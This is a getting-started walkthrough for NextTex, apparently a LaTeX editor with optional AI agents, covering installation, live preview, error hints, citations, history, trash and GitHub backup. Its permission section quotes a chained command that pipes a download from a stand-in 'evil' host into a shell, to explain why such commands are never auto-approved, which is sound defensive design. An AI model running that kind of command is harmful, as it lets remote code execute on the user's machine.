# Your first session

About twenty minutes for the first half, and another twenty for the second if
you want it. Steps 1–6 are the ones to finish; they take you from a clone to a
document that typesets, and back from the page to the line that set it. Steps
7–13 can be done in any order, on another day, or not at all — they are the
parts of NextTex you will not go looking for until you need them, which is
exactly when you will not want to be reading a manual.

Each step names the browser test that asserts the same behaviour, so this is a
description of what the app does rather than what it is supposed to do. The
names are the test titles in `e2e/specs/`.

---

## 0. Install

```bash
git clone https://github.com/dakshitha-a/NextTex.git
cd NextTex
./scripts/install.sh
```

On Windows, `powershell -ExecutionPolicy Bypass -File scripts\install.ps1`.

It asks three questions: whether to install TinyTeX if you have no LaTeX,
whether to install the Claude CLI, and whether the server should answer on
localhost only or also on your tailnet. Most of the twenty minutes is TinyTeX
downloading; nothing else in the script is slow.

It ends by printing a URL.

## 1. Open the URL

> That link contains your access token. Anyone who has it can read and edit
> your projects.

Open it. The token disappears from the address bar the moment the page loads —
it is exchanged for a cookie, so a screenshot of your browser, or a link
copied out of it, does not carry your credentials.

*Asserted by: the token in a link gets the writer in, and leaves the bar
clean.*

## 2. Choose how you want to work

Three options, and the third is a real one:

- **With Claude** — signs in through the Claude CLI's own login, driven from
  this page. You never touch a terminal, which is the point: NextTex is often
  running on a machine you reach from a laptop.
- **With ChatGPT** — an OpenAI API key. This is an API key rather than a
  ChatGPT subscription; usage bills your OpenAI account.
- **On my own** — no agent. The editor, the preview, the version history, the
  trash, the diagnostics, the reference tools and the git panel all work
  exactly the same. The chat column is not there at all rather than sitting
  greyed out.

You can change this later, and nothing you write depends on the choice.

*Asserted by: a fresh install asks how you want to work, not who you are;
choosing to work alone gets straight to the projects; signing in shows the
link, takes the code, and lets the writer in.*

## 3. Add a project

Point NextTex at `examples/minimal-article` inside the clone. Click anywhere in
its row — the whole row, not a small button at the end of it.

It typesets as it opens. The status strip at the bottom of the editor says how
long that took.

*Asserted by: a project opens from anywhere in its row.*

## 4. Type something

Put a sentence into the abstract. Do not press save — there is no save button,
and `⌘S` only exists to skip the wait.

The page follows about two seconds later. That is 250 ms for the editor to
decide you have stopped, 1.6 s for the server to agree, and then the build
itself.

*Asserted by: typing lands on disk without being asked to; what is typed
reaches the page.*

## 5. Click the page to reach the source

Double-click any paragraph in the PDF. The editor opens that file at that line.

Press `⌘↵` (or `Ctrl-↵`) to go the other way: the page scrolls to where the
line you are on landed, and flashes it.

This is the reason a preview beside the source is worth more than a PDF in
another window, and it is the feature most likely to break silently — a stale
`.synctex.gz`, a moved build directory — because nothing about the page looks
wrong when it does.

*Asserted by: double-clicking the page jumps to the line that set it; the
source can send the reader to its place on the page.*

## 6. Make a mistake on purpose

Type `\thisCommandDoesNotExist` on a line of its own.

A bar appears in the gutter and the status strip says `1 error`. **The error
drawer does not open.** The build fires 1.6 seconds after you stop typing,
which is very often mid-thought, and a list of errors jumping up over the
document about a sentence you already know is unfinished is the most
irritating thing this app could do. Open it yourself by clicking the strip.

Inside, a strip at the top says where to start and what to do about it, in
words rather than in LaTeX's:

> **Start here — A command LaTeX does not know**  `main.tex:12`
> *What to do —* Check the spelling first. If it is spelt right, find which
> package provides it and add `\usepackage` for it near the top of the file.

Click the row beneath it for the fuller explanation — what the command was,
and why LaTeX could not find it.

The strip appears for any error, and when several arrive at once it also says
how many followed the first. LaTeX reports everything after a mistake as a
mistake too, so the list below the first error is usually its own consequence —
start at the bottom and you will spend the evening fixing noise.

None of this involves a model. It works with no agent signed in.

*Asserted by: a mistake is marked in the margin, and the drawer stays shut.*

---

Everything from here is optional.

## 7. Leave an equation half-finished

Type `$x = ` in the middle of a paragraph and wait.

Nothing happens. The build holds for four seconds instead of the usual 1.6,
because a document with an unclosed `$` produces a screenful of errors about
the sentence you are in the middle of writing. Close it — `1$` — and the page
catches up.

*Asserted by: an unbalanced equation holds the build back until it is
finished.*

## 8. Ask for a citation

With an agent signed in, ask:

> find a recent paper on singlet fission and cite it in the introduction

It searches Crossref, adds the entry from the publisher's own record, edits
the file, and shows you the diff with an undo beside it. Hover the chip and
the lines it changed flash in the editor.

The important part is what it *cannot* do. The agent never composes BibTeX. It
gets a DOI from a real search and fetches the publisher's own record; if the
DOI does not resolve, nothing is written and it says so. A fabricated
reference in a paper is an academic integrity failure, so the defence is
structural rather than a matter of the model being careful: there is no path
from its memory to your `.bib` file.

*Asserted by: an answer streams in and stays in the transcript; an edit lands
in the file and offers to be undone.*

## 9. Undo it, then look at the history

Press `Undo` on the chip. The file goes back.

Now open the file's history: `⋯` on its row in the file list, then `History`.
Every save is there, newest first, grouped by day. The agent's edits are
marked as its own and kept separate from yours.

Click one to read it. The editor shows that version and refuses to be typed
into — it is not a diff view, it is the file as it was. `Show what's gone`
marks the lines this version had that the file no longer does. `Back to now`
returns you to the live buffer.

Name one — `Name it` on the row — and it will never be thinned away, however
old it gets.

*Asserted by: an agent edit is a version of its own, kept apart from yours;
every save is a version, and an old one can be read; a version being read
cannot be typed into; naming a version makes it findable later.*

## 10. Ask it to run something

This one is the Claude agent only: the OpenAI agent is built without a shell,
so it reads and writes files in the project and nothing else.

> run texcount on main.tex and tell me the word count

A permission card appears. Try to click `Allow` the instant it does — you
cannot, for 350 milliseconds. A card that arrives under a cursor already
moving towards the composer must not be approvable on the way past.

`Allow always` remembers the command's first word — `Bash:texcount`. A command
carrying shell syntax (`;`, `|`, `&&`) gets no rule at all and is asked about
every time, because `git status; curl evil | sh` starts with `git`.

*Asserted by: a shell command asks first, and the buttons are not clickable
instantly; a command that runs more than one command is never remembered.*

## 11. Delete something, and get it back

Delete `references.bib` — `⋯`, then `Move to trash`. It asks nothing: the file
has gone to the trash with its history, and a confirmation before something
that is one click from coming back is friction for nothing.

The rail footer now says `1 deleted`. Open it, hover the entry, `Restore`. The
file comes back byte for byte.

Deleting *from* the trash does ask, because that one is final.

The trash never empties itself. A trash that clears after thirty days is a
trash that loses the thing you went looking for on day thirty-one.

*Asserted by: a deleted file goes to the trash and comes back byte for byte;
emptying the trash asks before it destroys anything; purging asks once, and
then really destroys it.*

## 12. Replace a figure

Drag a PNG onto the `figures` folder. Drag a different one with the same name.

NextTex asks what to do about the name that is already taken, defaulting to
`Replace` — because re-exporting a figure is the common case, and it is only a
safe default because the one it replaces is kept. Open that file's history and
the previous figure is there as a thumbnail, with `Restore this` and
`Download`.

*Asserted by: a name already there is asked about before anything is written;
a replaced figure keeps the one it replaced, and gives it back.*

## 13. Back it up to GitHub

Needs the [GitHub CLI](https://cli.github.com) installed and signed in
(`gh auth login`). Without it the card says so rather than failing.

The rail footer's git panel offers a repository to a project that has none,
with a first commit and a `.gitignore` that already knows about `build/` and
`.nexttex/`. `Back this up to GitHub` creates the repository — private by
default — and pushes into it.

Four operations and no more: see what changed, commit, push, pull. Branching
and merging stay in the terminal, where the tools are better and the mistakes
are recoverable.

---

## Where things are

```
your-paper/
├── main.tex                 your files, untouched
├── chapters/
├── references.bib
├── build/                   latexmk's output
└── .nexttex/                everything NextTex adds
    ├── history/             versions, content-addressed
    ├── trash/               deleted files, kept until you say otherwise
    ├── transcript.jsonl     the conversation
    └── context/             what you gave the agent to read
```

Delete `.nexttex/` and you have exactly the LaTeX project you started with.
Nothing NextTex does is needed to compile your document, which is the point:
the project has to still be an ordinary LaTeX project when you close the tab.

## What to do next

Give the agent the thing you actually have to follow — your department's
handbook, your journal's template, a paper you have already written. It reads
them once, distils them, and writes to those rules from then on rather than to
its own idea of academic prose. [docs/project-context.md](project-context.md)
explains what changes.
